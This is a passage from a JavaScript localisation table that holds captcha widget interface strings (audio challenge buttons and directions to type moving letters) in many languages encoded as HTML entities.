"_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Digite as letras ou n&#250;meros que ouviu na amostra","_DIRECTIONS_AUDIO[0000]_":"Letras ou n&#250;meros que ouviu:",_AUDIO_BUTTON_RETURN_:"Regressar ao captcha","_DIRECTIONS2[0000]_":"Letras em movimento:","_DIRECTIONS2_VERBOSE[0000]_":"Digite as letras em movimento","_DIRECTIONS2_AUDIO[0000]_":"Letras ou n&#250;meros que ouviu:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Digite as letras ou n&#250;meros que ouviu na amostra",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",
_JS_REQUIRED_:""},bra:{_DOWNLOAD_AUDIO_:"Baixar a amostra de &#225;udio",_AUDIO_LISTEN_AGAIN_:"Repetir amostra de &#225;udio",_AUDIO_NEW_CHALLENGE_:"Obter novo captcha",_REFRESH_BUTTON_:"Obter um novo captcha",_AUDIO_BUTTON_:"Obter um novo &#225;udio",_PLAYER_AUDIO_:"Desafio de &#225;udio",_PLAYER_VIDEO_:"Desafio v&#237;deo","_DIRECTIONS_VERBOSE[0000]_":"Digite as letras em movimento","_DIRECTIONS[0000]_":"Letras em movimento:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Digite as letras ou n&#250;meros que ouviu na amostra",
"_DIRECTIONS_AUDIO[0000]_":"Letras ou n&#250;meros que voc&#234; ouviu:",_AUDIO_BUTTON_RETURN_:"Volte ao captcha","_DIRECTIONS2[0000]_":"Letras em movimento:","_DIRECTIONS2_VERBOSE[0000]_":"Digite as letras em movimento","_DIRECTIONS2_AUDIO[0000]_":"Letras ou n&#250;meros que voc&#234; ouviu:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Digite as letras ou n&#250;meros que ouviu na amostra",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},rus:{_DOWNLOAD_AUDIO_:"&#1047;&#1072;&#1075;&#1088;&#1091;&#1079;&#1080;&#1090;&#1100; &#1079;&#1074;&#1091;&#1082;&#1086;&#1074;&#1091;&#1102; &#1079;&#1072;&#1087;&#1080;&#1089;&#1100;",
_AUDIO_LISTEN_AGAIN_:"&#1055;&#1086;&#1074;&#1090;&#1086;&#1088;&#1080;&#1090;&#1100; &#1079;&#1074;&#1091;&#1082;&#1086;&#1074;&#1091;&#1102; &#1079;&#1072;&#1087;&#1080;&#1089;&#1100;",_AUDIO_NEW_CHALLENGE_:"&#1053;&#1072;&#1095;&#1072;&#1090;&#1100; &#1089;&#1085;&#1072;&#1095;&#1072;&#1083;&#1072;",_REFRESH_BUTTON_:"&#1053;&#1072;&#1095;&#1072;&#1090;&#1100; &#1089;&#1085;&#1072;&#1095;&#1072;&#1083;&#1072;",_AUDIO_BUTTON_:"&#1055;&#1088;&#1086;&#1089;&#1083;&#1091;&#1096;&#1072;&#1090;&#1100; &#1079;&#1074;&#1091;&#1082;&#1086;&#1074;&#1091;&#1102; &#1079;&#1072;&#1087;&#1080;&#1089;&#1100;",
_PLAYER_AUDIO_:"&#1047;&#1074;&#1091;&#1082;&#1086;&#1074;&#1072;&#1103; &#1079;&#1072;&#1087;&#1080;&#1089;&#1100;",_PLAYER_VIDEO_:"&#1042;&#1080;&#1076;&#1077;&#1086;&#1079;&#1072;&#1087;&#1080;&#1089;&#1100;","_DIRECTIONS_VERBOSE[0000]_":"&#1042;&#1074;&#1077;&#1076;&#1080;&#1090;&#1077; &#1087;&#1083;&#1072;&#1074;&#1072;&#1102;&#1097;&#1080;&#1077; &#1073;&#1091;&#1082;&#1074;&#1099;","_DIRECTIONS[0000]_":"&#1055;&#1083;&#1072;&#1074;&#1072;&#1102;&#1097;&#1080;&#1077; &#1073;&#1091;&#1082;&#1074;&#1099;:",
"_DIRECTIONS_VERBOSE_AUDIO[0000]_":"&#1042;&#1074;&#1077;&#1076;&#1080;&#1090;&#1077; &#1073;&#1091;&#1082;&#1074;&#1099; &#1080;&#1083;&#1080; &#1095;&#1080;&#1089;&#1083;&#1072;&#44; &#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1077; &#1091;&#1089;&#1083;&#1099;&#1096;&#1080;&#1090;&#1077; &#1074; &#1072;&#1091;&#1076;&#1080;&#1086;&#1079;&#1072;&#1087;&#1080;&#1089;&#1080;","_DIRECTIONS_AUDIO[0000]_":"&#1041;&#1091;&#1082;&#1074;&#1099; &#1080;&#1083;&#1080; &#1095;&#1080;&#1089;&#1083;&#1072;&#44; &#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1077; &#1042;&#1099; &#1089;&#1083;&#1099;&#1096;&#1080;&#1090;&#1077;:",
_AUDIO_BUTTON_RETURN_:"&#1042;&#1077;&#1088;&#1085;&#1091;&#1090;&#1100;&#1089;&#1103; &#1082; &#1075;&#1088;&#1072;&#1092;&#1080;&#1095;&#1077;&#1089;&#1082;&#1086;&#1081; &#1087;&#1088;&#1086;&#1074;&#1077;&#1088;&#1082;&#1077;","_DIRECTIONS2[0000]_":"&#1055;&#1083;&#1072;&#1074;&#1072;&#1102;&#1097;&#1080;&#1077; &#1073;&#1091;&#1082;&#1074;&#1099;:","_DIRECTIONS2_VERBOSE[0000]_":"&#1042;&#1074;&#1077;&#1076;&#1080;&#1090;&#1077; &#1087;&#1083;&#1072;&#1074;&#1072;&#1102;&#1097;&#1080;&#1077; &#1073;&#1091;&#1082;&#1074;&#1099;",
"_DIRECTIONS2_AUDIO[0000]_":"&#1041;&#1091;&#1082;&#1074;&#1099; &#1080;&#1083;&#1080; &#1095;&#1080;&#1089;&#1083;&#1072;&#44; &#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1077; &#1042;&#1099; &#1089;&#1083;&#1099;&#1096;&#1080;&#1090;&#1077;:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"&#1042;&#1074;&#1077;&#1076;&#1080;&#1090;&#1077; &#1073;&#1091;&#1082;&#1074;&#1099; &#1080;&#1083;&#1080; &#1095;&#1080;&#1089;&#1083;&#1072;&#44; &#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1077; &#1091;&#1089;&#1083;&#1099;&#1096;&#1080;&#1090;&#1077; &#1074; &#1072;&#1091;&#1076;&#1080;&#1086;&#1079;&#1072;&#1087;&#1080;&#1089;&#1080;",
_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},swe:{_DOWNLOAD_AUDIO_:"H&#228;mta ett ljudtest",_AUDIO_LISTEN_AGAIN_:"Spela ljudtestet igen",_AUDIO_NEW_CHALLENGE_:"F&#229; ett nytt test",_REFRESH_BUTTON_:"Ett nytt test",_AUDIO_BUTTON_:"Ett nytt ljudtest",_PLAYER_AUDIO_:"Ljudtest",_PLAYER_VIDEO_:"Videotest","_DIRECTIONS_VERBOSE[0000]_":"Skriv de r&#246;rliga bokst&#228;verna","_DIRECTIONS[0000]_":"R&#246;rliga bokst&#228;ver:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Skriv bokst&#228;verna eller siffrorna som du h&#246;r",
"_DIRECTIONS_AUDIO[0000]_":"Bokst&#228;ver eller siffror som du h&#246;r:",_AUDIO_BUTTON_RETURN_:"G&#229; tillbaka till visuelltest.","_DIRECTIONS2[0000]_":"R&#246;rliga bokst&#228;ver:","_DIRECTIONS2_VERBOSE[0000]_":"Skriv de r&#246;rliga bokst&#228;verna","_DIRECTIONS2_AUDIO[0000]_":"Bokst&#228;ver eller siffror som du h&#246;r:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Skriv bokst&#228;verna eller siffrorna som du h&#246;r",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},
tha:{_DOWNLOAD_AUDIO_:"&#3604;&#3634;&#3623;&#3609;&#3660;&#3650;&#3627;&#3621;&#3604;&#3619;&#3627;&#3633;&#3626;&#3618;&#3639;&#3609;&#3618;&#3633;&#3609;&#3648;&#3626;&#3637;&#3618;&#3591;",_AUDIO_LISTEN_AGAIN_:"&#3619;&#3633;&#3610;&#3615;&#3633;&#3591;&#3605;&#3633;&#3623;&#3629;&#3618;&#3656;&#3634;&#3591;&#3648;&#3626;&#3637;&#3618;&#3591;&#3629;&#3637;&#3585;&#3588;&#3619;&#3633;&#3657;&#3591;",_AUDIO_NEW_CHALLENGE_:"&#3619;&#3633;&#3610;&#3619;&#3627;&#3633;&#3626;&#3618;&#3639;&#3609;&#3618;&#3633;&#3609;&#3651;&#3627;&#3617;&#3656;",
_REFRESH_BUTTON_:"&#3619;&#3633;&#3610;&#3619;&#3627;&#3633;&#3626;&#3618;&#3639;&#3609;&#3618;&#3633;&#3609;&#3651;&#3627;&#3617;&#3656;",_AUDIO_BUTTON_:"&#3619;&#3633;&#3610;&#3619;&#3627;&#3633;&#3626;&#3618;&#3639;&#3609;&#3618;&#3633;&#3609;&#3648;&#3626;&#3637;&#3618;&#3591;",_PLAYER_AUDIO_:"&#3619;&#3627;&#3633;&#3626;&#3618;&#3639;&#3609;&#3618;&#3633;&#3609;&#3648;&#3626;&#3637;&#3618;&#3591;",_PLAYER_VIDEO_:"&#3619;&#3627;&#3633;&#3626;&#3618;&#3639;&#3609;&#3618;&#3633;&#3609;&#3623;&#3637;&#3604;&#3637;&#3650;&#3629;",
"_DIRECTIONS_VERBOSE[0000]_":"&#3614;&#3636;&#3617;&#3614;&#3660;&#3605;&#3633;&#3623;&#3629;&#3633;&#3585;&#3625;&#3619;&#3607;&#3637;&#3656;&#3648;&#3588;&#3621;&#3639;&#3656;&#3629;&#3609;&#3652;&#3627;&#3623;","_DIRECTIONS[0000]_":"&#3605;&#3633;&#3623;&#3629;&#3633;&#3585;&#3625;&#3619;&#3607;&#3637;&#3656;&#3648;&#3588;&#3621;&#3639;&#3656;&#3629;&#3609;&#3652;&#3627;&#3623;&#3588;&#3639;&#3629;:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"&#3614;&#3636;&#3617;&#3614;&#3660;&#3605;&#3633;&#3623;&#3648;&#3621;&#3586;&#3607;&#3637;&#3656;&#3588;&#3640;&#3603;&#3652;&#3604;&#3657;&#3618;&#3636;&#3609;",
"_DIRECTIONS_AUDIO[0000]_":"&#3605;&#3633;&#3623;&#3648;&#3621;&#3586;&#3607;&#3637;&#3656;&#3588;&#3640;&#3603;&#3652;&#3604;&#3657;&#3618;&#3636;&#3609;:",_AUDIO_BUTTON_RETURN_:"&#3585;&#3621;&#3633;&#3610;&#3652;&#3611;&#3618;&#3633;&#3591;&#3627;&#3609;&#3657;&#3634;&#3619;&#3627;&#3633;&#3626;&#3618;&#3639;&#3609;&#3618;&#3633;&#3609;","_DIRECTIONS2[0000]_":"&#3605;&#3633;&#3623;&#3629;&#3633;&#3585;&#3625;&#3619;&#3607;&#3637;&#3656;&#3648;&#3588;&#3621;&#3639;&#3656;&#3629;&#3609;&#3652;&#3627;&#3623;&#3588;&#3639;&#3629;:",
"_DIRECTIONS2_VERBOSE[0000]_":"&#3614;&#3636;&#3617;&#3614;&#3660;&#3605;&#3633;&#3623;&#3629;&#3633;&#3585;&#3625;&#3619;&#3607;&#3637;&#3656;&#3648;&#3588;&#3621;&#3639;&#3656;&#3629;&#3609;&#3652;&#3627;&#3623;","_DIRECTIONS2_AUDIO[0000]_":"&#3605;&#3633;&#3623;&#3648;&#3621;&#3586;&#3607;&#3637;&#3656;&#3588;&#3640;&#3603;&#3652;&#3604;&#3657;&#3618;&#3636;&#3609;:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"&#3614;&#3636;&#3617;&#3614;&#3660;&#3605;&#3633;&#3623;&#3648;&#3621;&#3586;&#3607;&#3637;&#3656;&#3588;&#3640;&#3603;&#3652;&#3604;&#3657;&#3618;&#3636;&#3609;",
_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},crh:{_DOWNLOAD_AUDIO_:"Sesli Testi &#304;ndir",_AUDIO_LISTEN_AGAIN_:"Ses &#214;rne&#287;ini Yeniden &#199;al",_AUDIO_NEW_CHALLENGE_:"Yeni Test",_REFRESH_BUTTON_:"Yeni Test",_AUDIO_BUTTON_:"Sesli Test",_PLAYER_AUDIO_:"Ses Testi",_PLAYER_VIDEO_:"Video Testi","_DIRECTIONS_VERBOSE[0000]_":"Hareketli harfleri yaz&#305;n","_DIRECTIONS[0000]_":"Hareketli harfler:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Ses &#214;rne&#287;inde duydu&#287;unuz harfleri veya say&#305;lar&#305; yaz&#305;n",
"_DIRECTIONS_AUDIO[0000]_":"Duydu&#287;unuz harfler veya say&#305;lar:",_AUDIO_BUTTON_RETURN_:"G&#246;rsel Teste Geri D&#246;n","_DIRECTIONS2[0000]_":"Hareketli harfler:","_DIRECTIONS2_VERBOSE[0000]_":"Hareketli harfleri yaz&#305;n","_DIRECTIONS2_AUDIO[0000]_":"Duydu&#287;unuz harfler veya say&#305;lar:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Ses &#214;rne&#287;inde duydu&#287;unuz harfleri veya say&#305;lar&#305; yaz&#305;n",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},
vie:{_DOWNLOAD_AUDIO_:"T&#7843;i v&#7873; m&#7851;u Captcha Audio",_AUDIO_LISTEN_AGAIN_:"Ph&#225;t &#226;m m&#7851;u Captcha",_AUDIO_NEW_CHALLENGE_:"Nh&#7853;n m&#7851;u Captcha m&#7899;i",_REFRESH_BUTTON_:"Nh&#7853;n m&#7851;u Captcha m&#7899;i",_AUDIO_BUTTON_:"Nh&#7853;n m&#7851;u Captcha Audio",_PLAYER_AUDIO_:"M&#7851;u Audio",_PLAYER_VIDEO_:"M&#7851;u Video","_DIRECTIONS_VERBOSE[0000]_":"Nh&#7853;p k&#253; t&#7921; ch&#7919; &#273;&#7897;ng","_DIRECTIONS[0000]_":"K&#253; t&#7921; ch&#7919; &#273;&#7897;ng:",
"_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Nh&#7853;p c&#225;c k&#253; t&#7921; nghe &#273;&#432;&#7907;c","_DIRECTIONS_AUDIO[0000]_":"C&#225;c k&#253; t&#7921; b&#7841;n nghe l&#224;:",_AUDIO_BUTTON_RETURN_:"Tr&#7903; l&#7841;i M&#7851;u H&#236;nh &#7842;nh","_DIRECTIONS2[0000]_":"K&#253; t&#7921; ch&#7919; &#273;&#7897;ng:","_DIRECTIONS2_VERBOSE[0000]_":"Nh&#7853;p k&#253; t&#7921; ch&#7919; &#273;&#7897;ng","_DIRECTIONS2_AUDIO[0000]_":"C&#225;c k&#253; t&#7921; b&#7841;n nghe l&#224;:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Nh&#7853;p c&#225;c k&#253; t&#7921; nghe &#273;&#432;&#7907;c",
_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},zho:{_DOWNLOAD_AUDIO_:"&#19979;&#36733;&#38899;&#39057;&#38382;&#39064;",_AUDIO_LISTEN_AGAIN_:"&#37325;&#25773;&#38899;&#39057;&#20363;&#21477;",_AUDIO_NEW_CHALLENGE_:"&#33719;&#21462;&#26032;&#38382;&#39064;",_REFRESH_BUTTON_:"&#33719;&#21462;&#26032;&#38382;&#39064;",_AUDIO_BUTTON_:"&#33719;&#21462;&#26032;&#38899;&#39057;&#38382;&#39064;",_PLAYER_AUDIO_:"&#38899;&#39057;&#38382;&#39064;",_PLAYER_VIDEO_:"&#35270;&#39057;&#38382;&#39064;",
"_DIRECTIONS_VERBOSE[0000]_":"&#36755;&#20837;&#26179;&#21160;&#30340;&#23383;&#27597;","_DIRECTIONS[0000]_":"&#26179;&#21160;&#30340;&#23383;&#27597;&#65306;","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"&#36755;&#20837;&#24744;&#22312;&#38899;&#39057;&#20013;&#21548;&#21040;&#30340;&#25968;&#23383;","_DIRECTIONS_AUDIO[0000]_":"&#24744;&#21548;&#21040;&#30340;&#25968;&#23383;&#65306;",_AUDIO_BUTTON_RETURN_:"&#36820;&#22238;&#35270;&#39057;&#38382;&#39064;","_DIRECTIONS2[0000]_":"&#26179;&#21160;&#30340;&#23383;&#27597;&#65306;",
"_DIRECTIONS2_VERBOSE[0000]_":"&#36755;&#20837;&#26179;&#21160;&#30340;&#23383;&#27597;","_DIRECTIONS2_AUDIO[0000]_":"&#24744;&#21548;&#21040;&#30340;&#25968;&#23383;&#65306;","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"&#36755;&#20837;&#24744;&#22312;&#38899;&#39057;&#20013;&#21548;&#21040;&#30340;&#25968;&#23383;",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},cmn:{_DOWNLOAD_AUDIO_:"&#19979;&#36617;&#38899;&#35338;&#21839;&#38988;",_AUDIO_LISTEN_AGAIN_:"&#25773;&#25918;&#38899;&#35338;&#27171;&#26412;",
_AUDIO_NEW_CHALLENGE_:"&#21462;&#24471;&#26032;&#21839;&#38988;",_REFRESH_BUTTON_:"&#21462;&#24471;&#26032;&#21839;&#38988;",_AUDIO_BUTTON_:"&#21462;&#24471;&#26032;&#38899;&#35338;&#21839;&#38988;",_PLAYER_AUDIO_:"&#38899;&#35338;&#21839;&#38988;",_PLAYER_VIDEO_:"&#35222;&#35338;&#21839;&#38988;","_DIRECTIONS_VERBOSE[0000]_":"&#36664;&#20837;&#26179;&#21205;&#30340;&#23383;&#27597;","_DIRECTIONS[0000]_":"&#26179;&#21205;&#30340;&#23383;&#27597;&#65306;","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"&#36664;&#20837;&#24744;&#22312;&#38899;&#35338;&#20013;&#32893;&#21040;&#30340;&#25976;&#23383;",
"_DIRECTIONS_AUDIO[0000]_":"&#24744;&#32893;&#21040;&#30340;&#25976;&#23383;&#65306;",_AUDIO_BUTTON_RETURN_:"&#36820;&#22238;&#35222;&#35338;&#21839;&#38988;","_DIRECTIONS2[0000]_":"&#26179;&#21205;&#30340;&#23383;&#27597;&#65306;","_DIRECTIONS2_VERBOSE[0000]_":"&#36664;&#20837;&#26179;&#21205;&#30340;&#23383;&#27597;","_DIRECTIONS2_AUDIO[0000]_":"&#24744;&#32893;&#21040;&#30340;&#25976;&#23383;&#65306;","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"&#36664;&#20837;&#24744;&#22312;&#38899;&#35338;&#20013;&#32893;&#21040;&#30340;&#25976;&#23383;",
_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},yue:{_DOWNLOAD_AUDIO_:"&#19979;&#36617;&#38899;&#35338;&#21839;&#38988;",_AUDIO_LISTEN_AGAIN_:"&#25773;&#25918;&#38899;&#35338;&#27171;&#26412;",_AUDIO_NEW_CHALLENGE_:"&#21462;&#24471;&#26032;&#21839;&#38988;",_REFRESH_BUTTON_:"&#21462;&#24471;&#26032;&#21839;&#38988;",_AUDIO_BUTTON_:"&#21462;&#24471;&#26032;&#38899;&#35338;&#21839;&#38988;",_PLAYER_AUDIO_:"&#38899;&#35338;&#21839;&#38988;",_PLAYER_VIDEO_:"&#35222;&#35338;&#21839;&#38988;",
"_DIRECTIONS_VERBOSE[0000]_":"&#36664;&#20837;&#26179;&#21205;&#30340;&#23383;&#27597;","_DIRECTIONS[0000]_":"&#26179;&#21205;&#30340;&#23383;&#27597;&#65306;","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"&#36664;&#20837;&#24744;&#22312;&#38899;&#35338;&#20013;&#32893;&#21040;&#30340;&#25976;&#23383;","_DIRECTIONS_AUDIO[0000]_":"&#24744;&#32893;&#21040;&#30340;&#25976;&#23383;&#65306;",_AUDIO_BUTTON_RETURN_:"&#36820;&#22238;&#35222;&#35338;&#21839;&#38988;","_DIRECTIONS2[0000]_":"&#26179;&#21205;&#30340;&#23383;&#27597;&#65306;",
"_DIRECTIONS2_VERBOSE[0000]_":"&#36664;&#20837;&#26179;&#21205;&#30340;&#23383;&#27597;","_DIRECTIONS2_AUDIO[0000]_":"&#24744;&#32893;&#21040;&#30340;&#25976;&#23383;&#65306;","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"&#36664;&#20837;&#24744;&#22312;&#38899;&#35338;&#20013;&#32893;&#21040;&#30340;&#25976;&#23383;",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},hans:{_DOWNLOAD_AUDIO_:"&#19979;&#36733;&#38899;&#39057;&#38382;&#39064;",_AUDIO_LISTEN_AGAIN_:"&#37325;&#25773;&#38899;&#39057;&#20363;&#21477;",
_AUDIO_NEW_CHALLENGE_:"&#33719;&#21462;&#26032;&#38382;&#39064;",_REFRESH_BUTTON_:"&#33719;&#21462;&#26032;&#38382;&#39064;",_AUDIO_BUTTON_:"&#33719;&#21462;&#26032;&#38899;&#39057;&#38382;&#39064;",_PLAYER_AUDIO_:"&#38899;&#39057;&#38382;&#39064;",_PLAYER_VIDEO_:"&#35270;&#39057;&#38382;&#39064;","_DIRECTIONS_VERBOSE[0000]_":"&#36755;&#20837;&#26179;&#21160;&#30340;&#23383;&#27597;","_DIRECTIONS[0000]_":"&#26179;&#21160;&#30340;&#23383;&#27597;&#65306;","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"&#36755;&#20837;&#24744;&#22312;&#38899;&#39057;&#20013;&#21548;&#21040;&#30340;&#25968;&#23383;",
"_DIRECTIONS_AUDIO[0000]_":"&#24744;&#21548;&#21040;&#30340;&#25968;&#23383;&#65306;",_AUDIO_BUTTON_RETURN_:"&#36820;&#22238;&#35270;&#39057;&#38382;&#39064;","_DIRECTIONS2[0000]_":"&#26179;&#21160;&#30340;&#23383;&#27597;&#65306;","_DIRECTIONS2_VERBOSE[0000]_":"&#36755;&#20837;&#26179;&#21160;&#30340;&#23383;&#27597;","_DIRECTIONS2_AUDIO[0000]_":"&#24744;&#21548;&#21040;&#30340;&#25968;&#23383;&#65306;","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"&#36755;&#20837;&#24744;&#22312;&#38899;&#39057;&#20013;&#21548;&#21040;&#30340;&#25968;&#23383;",
_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},hant:{_DOWNLOAD_AUDIO_:"&#19979;&#36617;&#38899;&#35338;&#21839;&#38988;",_AUDIO_LISTEN_AGAIN_:"&#25773;&#25918;&#38899;&#35338;&#27171;&#26412;",_AUDIO_NEW_CHALLENGE_:"&#21462;&#24471;&#26032;&#21839;&#38988;",_REFRESH_BUTTON_:"&#21462;&#24471;&#26032;&#21839;&#38988;",_AUDIO_BUTTON_:"&#21462;&#24471;&#26032;&#38899;&#35338;&#21839;&#38988;",_PLAYER_AUDIO_:"&#38899;&#35338;&#21839;&#38988;",_PLAYER_VIDEO_:"&#35222;&#35338;&#21839;&#38988;",
"_DIRECTIONS_VERBOSE[0000]_":"&#36664;&#20837;&#26179;&#21205;&#30340;&#23383;&#27597;","_DIRECTIONS[0000]_":"&#26179;&#21205;&#30340;&#23383;&#27597;&#65306;","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"&#36664;&#20837;&#24744;&#22312;&#38899;&#35338;&#20013;&#32893;&#21040;&#30340;&#25976;&#23383;","_DIRECTIONS_AUDIO[0000]_":"&#24744;&#32893;&#21040;&#30340;&#25976;&#23383;&#65306;",_AUDIO_BUTTON_RETURN_:"&#36820;&#22238;&#35222;&#35338;&#21839;&#38988;","_DIRECTIONS2[0000]_":"&#26179;&#21205;&#30340;&#23383;&#27597;&#65306;",
"_DIRECTIONS2_VERBOSE[0000]_":"&#36664;&#20837;&#26179;&#21205;&#30340;&#23383;&#27597;","_DIRECTIONS2_AUDIO[0000]_":"&#24744;&#32893;&#21040;&#30340;&#25976;&#23383;&#65306;","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"&#36664;&#20837;&#24744;&#22312;&#38899;&#35338;&#20013;&#32893;&#21040;&#30340;&#25976;&#23383;",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},jpn:{_DOWNLOAD_AUDIO_:"&#38899;&#22768;&#12501;&#12449;&#12452;&#12523;&#12434;&#12480;&#12454;&#12531;&#12525;&#12540;&#12489;",
_AUDIO_LISTEN_AGAIN_:"&#38899;&#22768;&#12434;&#20877;&#29983;",_AUDIO_NEW_CHALLENGE_:"&#21029;&#12496;&#12540;&#12472;&#12519;&#12531;&#12434;&#20877;&#29983;",_REFRESH_BUTTON_:"&#21029;&#12496;&#12540;&#12472;&#12519;&#12531;&#12434;&#20877;&#29983;",_AUDIO_BUTTON_:"&#21029;&#12496;&#12540;&#12472;&#12519;&#12531;&#12398;&#38899;&#22768;&#12434;&#20877;&#29983;",_PLAYER_AUDIO_:"&#38899;&#22768;&#35469;&#35672;",_PLAYER_VIDEO_:"&#25991;&#23383;&#35469;&#35672;","_DIRECTIONS_VERBOSE[0000]_":"&#21205;&#12356;&#12390;&#12356;&#12427;&#25991;&#23383;&#12434;&#20837;&#21147;&#12375;&#12390;&#12367;&#12384;&#12373;&#12356;",
"_DIRECTIONS[0000]_":"&#21205;&#12356;&#12390;&#12356;&#12427;&#25991;&#23383;&#65306;","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"&#32884;&#12371;&#12360;&#12383;&#25968;&#23383;&#12434;&#20837;&#21147;&#12375;&#12390;&#12367;&#12384;&#12373;&#12356;","_DIRECTIONS_AUDIO[0000]_":"&#32884;&#12371;&#12360;&#12383;&#25968;&#23383;&#65306;",_AUDIO_BUTTON_RETURN_:"&#25991;&#23383;&#35469;&#35672;&#12408;&#25147;&#12427;","_DIRECTIONS2[0000]_":"&#21205;&#12356;&#12390;&#12356;&#12427;&#25991;&#23383;&#65306;",
"_DIRECTIONS2_VERBOSE[0000]_":"&#21205;&#12356;&#12390;&#12356;&#12427;&#25991;&#23383;&#12434;&#20837;&#21147;&#12375;&#12390;&#12367;&#12384;&#12373;&#12356;","_DIRECTIONS2_AUDIO[0000]_":"&#32884;&#12371;&#12360;&#12383;&#25968;&#23383;&#65306;","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"&#32884;&#12371;&#12360;&#12383;&#25968;&#23383;&#12434;&#20837;&#21147;&#12375;&#12390;&#12367;&#12384;&#12373;&#12356;",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},est:{_DOWNLOAD_AUDIO_:"Lae audio v&#228;ljakutse",
_AUDIO_LISTEN_AGAIN_:"Esita uuesti helin&#228;idise",_AUDIO_NEW_CHALLENGE_:"Hankige uus v&#228;ljakutse",_REFRESH_BUTTON_:"Hankige uus v&#228;ljakutse",_AUDIO_BUTTON_:"Hangi audio v&#228;ljakutse",_PLAYER_AUDIO_:"Audio v&#228;ljakutse",_PLAYER_VIDEO_:"Video v&#228;ljakutse","_DIRECTIONS_VERBOSE[0000]_":"Sisestage liiguvad tekst","_DIRECTIONS[0000]_":"Liikumine tekst:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Sisestage liigub tekst","_DIRECTIONS_AUDIO[0000]_":"T&#228;hed kuulete",_AUDIO_BUTTON_RETURN_:"Mine tagasi visuaalne v&#228;ljakutse",
"_DIRECTIONS2[0000]_":"Liikumine tekst:","_DIRECTIONS2_VERBOSE[0000]_":"Sisestage liiguvad tekst","_DIRECTIONS2_AUDIO[0000]_":"T&#228;hed kuulete","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Sisestage liigub tekst",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},lav:{_DOWNLOAD_AUDIO_:"Lejupiel&#257;d&#275;tu audio izaicin&#257;jumu",_AUDIO_LISTEN_AGAIN_:"Atska&#326;ot v&#275;lreiz audio izlases",_AUDIO_NEW_CHALLENGE_:"Ieg&#363;t jaunu izaicin&#257;jumu",_REFRESH_BUTTON_:"Ieg&#363;t jaunu izaicin&#257;jumu",
_AUDIO_BUTTON_:"Sa&#326;emt audio izaicin&#257;jumu",_PLAYER_AUDIO_:"Audiovizu&#257;lie izaicin&#257;jums",_PLAYER_VIDEO_:"Video izaicin&#257;jums","_DIRECTIONS_VERBOSE[0000]_":"Ierakstiet Kust&#299;gu burtus","_DIRECTIONS[0000]_":"Kust&#299;gu burtus:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Ierakstiet burtus dzirdat ar audio","_DIRECTIONS_AUDIO[0000]_":"Burti j&#363;s dzirdat:",_AUDIO_BUTTON_RETURN_:"Atgriezties uz vizu&#257;lo izaicin&#257;jumu","_DIRECTIONS2[0000]_":"Kust&#299;gu burtus:","_DIRECTIONS2_VERBOSE[0000]_":"Ierakstiet Kust&#299;gu burtus",
